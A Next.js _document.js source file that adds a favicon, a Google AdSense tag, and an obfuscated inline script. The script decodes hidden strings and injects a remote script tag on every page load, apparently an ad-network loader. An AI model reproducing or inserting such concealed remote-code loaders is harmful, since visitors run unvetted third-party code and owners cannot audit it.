import Document, { Html, Head, Main, NextScript } from 'next/document';
// import Script from 'next/script';

class MyDocument extends Document {
  static async getInitialProps(ctx) {
    const initialProps = await Document.getInitialProps(ctx);
    return { ...initialProps };
  }

  render() {
    return (
      <Html>
        <Head>
          <link rel="icon" href="/favicon.svg" />
          <script
              async
              src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1339539882255727"
              crossOrigin="anonymous"
          />
          <script type="text/javascript" data-cfasync="false">
            {`
              /*<![CDATA[/* */
              (function(){if(window.ee05df34921703334cba6a52748be1e5) return; window.ee05df34921703334cba6a52748be1e5="Ed9qESx14avdvUlWgerYOR3l1ZYrpbtHWsiv70rmIrM79Zap2p_KXXUUysaTd_ItT_bqIE3a9hsZKOc";var a=['wqzDmTFV','N8KYVibDoDnDqMKXAcOUw4Nl','esKrc8Kxw6luw7bClMKCfHkvbyJfdMOYw6zCsWY=','IMKUTiLDkB8=','wqXCmMO+a8Or','wpvCqw9Sw48Mw5zDqXk8XsOVw61EBMO3Dj3DjTkvwpDCizrCv8Owwr5Cwpdiw5jDhhvCqcOaUMKQwo/DsH5RwrLCqMK6w59wMBwXG8KQZsKew4YjZMKCw7vCrQ==','wqgIw73Co0wYZUo=','fcK8wqbDmsKxGWLDn8KfHF8=','woDCkHorYx9bwpDDvkvDvwxKw53CuCnDpcK6w40rDcOyaAHCl3vDiBvCkgpZdHDCgsOIZMO+acOCCcKhwoTCp2MWWAHCojrCg8O3','w7Zew4vDrMODw7Q=','b8KeC0t0w4U=','wo/DtxxIw4VQwonDr2ICDMOWw4pw','w7DDosOYZQ==','OzvCmXjCkBEzLsOZw6Y=','AMK4w6JJOEY=','RkTCocKBT2ozFA==','wqHClMKrw6AJRcOGO8OEC3rCh8KO','VMOIIcOmwo5Wwpwy','wqzDunPCsCTDq8Ka','bsK8ZA==','DcKHw5V+a3TCi8OtwpnCixPCvwY=','HcOMN8OqCMKOw7PCqV0=','c8OXw6LDkMOOwqTCk8KnGSJaw67CtcKLbA==','TcOLwpQiLQMb','OsKTSSLDqw/Dj8KGEMOew5Ru','w6DDpgXDkMKnw5FpwrFEV38K'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x19d));var b=function(c,d){c=c-0x0;var e=a[c];if(b['xLehXx']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['lllChK']=g;b['VDctmo']={};b['xLehXx']=!![];}var f=b['VDctmo'][c];if(f===undefined){if(b['nZPNLy']===undefined){b['nZPNLy']=!![];}e=b['lllChK'](e,d);b['VDctmo'][c]=e;}else{e=f;}return e;};var r=window;r[b('0xf','h&Ir')]=[[b('0x6','BSQs'),0x4be13c],[b('0x11','PhFa'),0x0],[b('0xe','JYnu'),'0'],[b('0x4','BSQs'),0x0],[b('0x0','rZQe'),![]],[b('0x13','VqgW'),0x0],[b('0x2','1Kx5'),!0x0]];var m=[b('0xb','BZo]'),b('0x8','JYnu')],z=0x0,s,h=function(){if(!m[z])return;s=r[b('0x12','!wUG')][b('0x17','EeDd')](b('0xc','2$78'));s[b('0x3','U#e6')]=b('0x19','5TST');s[b('0x7','F8ne')]=!0x0;var c=r[b('0x14','@#wW')][b('0x5','Ih[w')](b('0xd','r1aV'))[0x0];s[b('0x16','Ih[w')]=b('0x9','Sp9[')+m[z];s[b('0xa','jc4z')]=b('0x18','D1aI');s[b('0x15','P#Gn')]=function(){z++;h();};c[b('0x10','yh0g')][b('0x1','BSQs')](s,c);};h();})();
              /*]]>/* */
            `}
          </script>
        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}

export default MyDocument;